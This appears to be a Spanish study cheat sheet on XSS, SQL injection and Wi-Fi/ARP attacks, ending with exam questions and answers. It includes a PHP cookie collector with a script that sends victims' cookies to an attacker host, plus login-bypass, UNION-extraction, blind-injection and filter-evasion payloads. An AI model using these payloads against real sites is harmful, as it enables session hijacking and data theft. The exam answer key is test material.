<link rel="stylesheet" href="style.css">

# CheatSheet Ciberseguridad

## Indice

- [CheatSheet Ciberseguridad](#cheatsheet-ciberseguridad)
  - [Indice](#indice)
  - [Vulnerabilidades](#vulnerabilidades)
  - [Cross Site Scripting - XSS](#cross-site-scripting---xss)
    - [Tipos de XSS](#tipos-de-xss)
    - [Evasión de filtros de seguridad](#evasión-de-filtros-de-seguridad)
    - [Robo de Cookies](#robo-de-cookies)
  - [SQL Injection](#sql-injection)
    - [Tipos de SQL Injection](#tipos-de-sql-injection)
    - [Identificación de vulnerabilidades](#identificación-de-vulnerabilidades)
      - [Comprobar vulnerabilidad](#comprobar-vulnerabilidad)
      - [Tipo del parámetro vulnerable](#tipo-del-parámetro-vulnerable)
      - [Número de columnas a devolver](#número-de-columnas-a-devolver)
    - [Bypass de un login](#bypass-de-un-login)
    - [Explotacion](#explotacion)
    - [Boolean-Base Blind SQL Injection](#boolean-base-blind-sql-injection)
    - [Time-Base Blind SQL Injection](#time-base-blind-sql-injection)
    - [Evitar filtros](#evitar-filtros)
  - [Hacking en redes](#hacking-en-redes)
    - [Examen](#examen)

***

## Vulnerabilidades

## Cross Site Scripting - XSS

### Tipos de XSS

- **Reflejado**: El atacante puede ver el resultado de la ejecución del script en el navegador.
- **Persistente**: El atacante puede ejecutar el script en cualquier momento.
- **Basado en DOM**: Se lleva a cabo cuando el código malicioso se inyecta mediante la url pero no se carga como parte de la web en su código fuente

### Evasión de filtros de seguridad

- Utilizar URL Encode
- Uso de etiquetas HTML como IMG, FRAME, IFRAME, etc
- Utilizar etiquetas HTML5 como VIDEO, AUDIO, etc
- Utilizar funciones en JavaScript como "String.fromCharCode()"
- Inyectar código direactamente en código JavaScript válido

Más informacion:

- <https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet>
- <https://html5sec.org/>

### Robo de Cookies

Primero se sube un fichero (cookies.php) con el siguiente código en algún servidor en el que se tenga control:

```php
<?php
    $handle=fopen("cookies_list.txt","a");
    fputs($handle,"\n".$_GET["cookie"]."\n");
    fclose($handle);
?>
```

Ejemplo a petición para forzar al cliente a enviarnos sus cookies:

```html
<script>
    var i=new Image(); i.src="http://dominio/cookies.php?"%2bdocument.cookie;
</script>

%2b -> +
```

## SQL Injection

Se suele inyectar código SQL en los parámetros GET y POST pero es posible hacerlo en cualquier parámetro que forme parte de una consulta como por ejemplo en las cookies, cabecera referer, etc.

Estructura estandar de una consulta SQL:

```sql
SELECT [columna] FROM [tabla] WHERE [condicion]
```

Se usa UNION para unir el resultado de dos consultas:

```sql
SELECT [columna] FROM [tabla] WHERE [condicion] UNION 
SELECT [columna] FROM [tabla] WHERE [condicion]
```

Es importante que ambas consultas tengan el mismo número de columnas a devolver.

### Tipos de SQL Injection

- **SQL Injection (Mediante UNION)**
- **Serialized SQL Injection**
- **Boolean-Based SQL Injection**
- **Time-Based SQL Injection**
- **Heavy-Queries SQL Injection**
- **Stack-Queries**
- **Ataques avanzados mediante SQL Injection:**
  - **Ejecutar comandos**
  - **Lectura de ficheros**
  - **Escritura de ficheros**

### Identificación de vulnerabilidades

Estructura estandar de prueba:

```sql
SELECT usuario FROM usuarios WHERE usuario='parameter'
```

#### Comprobar vulnerabilidad

Añadiendo comillas simples o dobles a la consulta:

Parametro: '

```sql
SELECT usuario FROM usuarios WHERE usuario='''
```

Si sale error es que es vulnerable.

#### Tipo del parámetro vulnerable

- INT [ 1 AND 1=1 -- - ]

```sql
SELECT usuario FROM usuarios WHERE usuario=1 AND 1=1 -- -
```

- CHAR [ '1 AND 1=1 -- - ]

```sql
SELECT usuario FROM usuarios WHERE usuario='1' AND 1=1 -- -'
```

- STRING [ "1 AND 1=1 -- - ]

```sql
SELECT usuario FROM usuarios WHERE usuario="1" AND 1=1 -- -"
```

Solo si el parámetro coincide cargará la página.

#### Número de columnas a devolver

```sql
SELECT usuario FROM usuarios WHERE usuario='1' AND 1=1 ORDER BY 500 -- -'
```

Si el número de columnas a devolver es menor que el número que ponemos en el ORDER BY, saldrá un error.

### Bypass de un login

Estructura estandar de prueba de la consulta Login:

```sql
SELECT usuario FROM usuarios WHERE usuario = 'admin' AND password = "admin"
```

Si la consulta está vacía no devuelve nada y no permitirá acceso, en caso contrario sí, **dando igual que haya uno o más registros**.

Sabiendo eso se puede usar el parámetro mágico: ' OR 1=1

```sql
SELECT usuario FROM usuarios WHERE usuario = '' OR '1'='1' AND password="" OR "1"="1"
```

Al ser todo verdadero devolverá la tabla completa de usuarios.

En caso de querer entrar en una cuenta en específico bastaría con cambiar el usuario a el que queremos acceder y dejamos el password con la frase mágica.

### Explotacion

1. Recopilación de información sobre usuarios, versión, etc.
   - **User()**: Que usuario ejecuta las consultas en la app.
   - **database()**: Nombre de la base de datos.
   - **@@version**: Que versión tenemos.
   - **@@datadir**: Donde está instalado MySQL.

```text
        http://dominio/noticias.php?id=1 and 1=0 union select user(),database()
        http://dominio/noticias.php?id=1 and 1=0 union select @@version,@@datadir
```

1. Extracción de información de la base de datos.
2. Extracción de las tablas de la base de datos seleccionada.
3. Extracción de las columnas de la tabla seleccionada.
4. Realizar las consultas personalizadas de las columnas y la tabla seleccionada.

Para sacar toda esta información usaremos la base de datos **information_schema**.

| Descripción                  | Tabla                       | Columna     |
|:----------------------------:|:---------------------------:|:-----------:|
| Nombre de las bases de datos | information_schema.schemata | schema_name |
| Nombre de las tablas         | information_schema.tables   | table_name  |
| Nombre de las columnas       | information_schema.columns  | column_name |

En muchos casos solo nos deja devolver un solo registro, por lo que se usará la función **concat()** o **group_concat()** para unir toda la información.

```sql
-- Bases de datos

http://dominio/noticias.php?id=3 and 1=0 union 
select group_concat(schema_name) from information_schema.schemata

-- Tablas

http://dominio/noticias.php?id=3 and 1=0 union
select group_concat(table_name) from information_schema.tables where table_schema = 'nombre_BBDD'

-- Columnas

http://dominio/noticias.php?id=3 and 1=0 union
select group_concat(column_name) from information_schema.columns where
table_name = 'nombre_tabla'

-- Consultas personalizadas

http://dominio/noticias.php?id=3 and 1=0 union
select group_concat('nombre_columna') from nombre_tabla
```

En caso de que no se pueda sacar el nombre de las tablas y columnas, se deberán extraer el nombre usando fuerza bruta.

### Boolean-Base Blind SQL Injection

En este caso la web no muestra ningún mensaje de error ni tampoco información.

Las inyecciones ciegas son muy lentas y pesadas de explotar. Por ese motivo se suelen automatizar.

```sql
http://dominio/noticias.php?id=1 AND 1=0 UNION
SELECT substr(user_name,1,1)=‘a’ from administrators
```

Si el primer caracter del primer nombre de usuario es una 'a' será verdadero y no mostrará error

### Time-Base Blind SQL Injection

En este caso no se muestra ningún dato por pantalla, ni siquiera los errores.

Aun así se pueden realizar consultas con un sleep, esto permitirá extraer información dependiendo del tiempo que se demora la consulta.

```sql
http://dominio/noticias.php?id=1 AND 1=0 UNION
SELECT 1, substr(user_name,1,1)=‘a’ from administrators and sleep(5)
```

### Evitar filtros

Query de prueba:

```sql
SELECT usuario FROM usuarios WHERE usuario='' or 1=1 -- -'
```

- Poner comentarios en vez de ejemplos [ **'/\*\*/or/\*\*/1=0/\*\*/#**]
  - --X
  - /\*X\*/
  - %00

```sql
    SELECT usuario FROM usuarios WHERE usuario=''/**/or/**/1=0/**/#'
```

- Poner el payload en char [ **' CHAR(111, 114) 1=1**]

```sql
    SELECT usuario FROM usuarios WHERE usuario='' CHAR(111,114) 1=1-- -'
```

- Usar anti-comentarios [' and '1'='0' union/\*!select\*/pass from users#]

```sql
    SELECT usuario FROM usuarios WHERE usuario='' and '1'='0' union/*!select*/pass from users#'
```

- Usar ofuscación simple [ ' and '1'='0' uNiOn SeLeCt pass fRoM users# ]
  - SELECT -> SeLeCt

```sql
    SELECT usuario FROM usuarios WHERE usuario='' and '1'='0' uNiOn SeLeCt pass fRoM users#'
```

- Envitar AND y OR:
  - AND -> &&
  - OR -> ||

***

## Hacking en redes

### Examen

- 1. ¿En qué consiste configurar la tarjeta de red en modo "monitor"?
  - Capturar paquetes de cualquier red sin definir cliente.
- 2. ¿Para qué es habitualmente usada la técnica ARP Spoofing?
  - Alterar la relación entre IP y MAC de un cliente.
- 3. ¿Cómo puede desarrollarse la técnica DHCP Spoofing?
  - Desplegando un servidor DHCP falso en la red.
- 4. ¿Cuál de las siguiente afirmaciones es cierta respector de un sistema de distribución?
  - Todos los APs comparten un mismo ESSID.
- 5. ¿Cuál es el significado del concepto "Station" en redes Wi-Fi?
  - La MAC del cliente de una red.
- 6. ¿En que tipo de red es necesario capturar el handshake al realizar el proceso de cracking con el que obtener la clave en claro de acceso?
  - WPA/WPA2 - PSK.
- 7. ¿Qué tipo de acción/es podrían realizarse directamente al desarrollar ataques contra clientes en redes Wi-Fi?
  - Capturar credenciales o información sensible.
  - Realizar ataques DDoS.
- 8. ¿Cuál de las siguientes opciones aporta un mayor nivel de seguridad en una red Wi-Fi?
  - WPA2-Enterprise.
- 9. ¿Puede un cliente en un red Wi-Fi estar conectado a dos puntos de acceso a la vez en un sistema de distribución?
  - Falso.
- 10. ¿Es posible desarrollar un ataque MiTM basado en ARP Spoofing entre dos equipos en Internet?
  - Falso.
- 11. Explicar el proceso para realizar de forma completa proceso de MiTM basado en ARP Spoofing. Indica además como sería posible realizar un ataque de DoS mediante esta misma técnica.
  - Se envian paquetes ARP reply a la victima para que se piense que somos el equipo con quien se quiere comunicar.
  - El ataque DoS se puede realizar redirigiendo todas las comunicaciones de tu victima a tu equipo y que no las deje pasar a su destino.
